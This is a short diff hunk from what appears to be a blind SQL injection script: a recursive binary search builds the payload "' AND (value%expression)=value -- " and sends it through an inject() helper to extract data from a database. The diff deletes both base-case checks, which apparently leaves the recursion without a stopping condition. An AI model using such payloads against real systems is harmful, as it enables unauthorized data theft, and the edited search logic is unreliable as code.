@@ -60,12 +60,8 @@ def binary_search(expression, lmin=0, lmax=255):
     #  expression > value
     payload = "' AND ({value}%{expression})={value} -- ".format(expression=expression, value=value)
     if inject(payload):
-        if lmax - lmin == 1:
-            return lmax
         return binary_search(expression, value + 1, lmax)
     else:
-        if lmax - lmin == 1:
-            return lmin
         return binary_search(expression, lmin, value)
 
 
